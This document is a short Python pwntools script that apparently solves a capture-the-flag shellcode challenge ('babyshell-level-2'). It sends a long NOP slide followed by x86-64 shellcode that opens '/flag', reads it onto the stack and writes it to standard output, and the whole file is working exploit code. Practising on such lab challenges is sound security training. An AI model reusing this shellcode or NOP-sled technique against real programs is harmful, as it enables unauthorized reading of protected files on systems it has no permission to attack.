import pwn 
pwn.context.arch='AMD64' 
chall = "/challenge/babyshell-level-2" 
r = pwn.process(chall) 
nopslide=pwn.asm("nop")*1800
shellcode=pwn.asm(f""" 
mov rax, 2 
mov rsi, 0 
mov rdx, 0 
lea rdi, [rip + flagtext] 
syscall 
mov rdi, rax 
mov rax, 0 
mov rsi, rsp 
mov rdx, 1000 
syscall 
mov rax, 1 
mov rdi, 1 
syscall 
mov rax, 60 
mov rdi, 0 
syscall 

flagtext: 
.ascii "/flag" 
""") 
payload = nopslide + shellcode
r.send(payload) 
r.interactive() 
r.clean()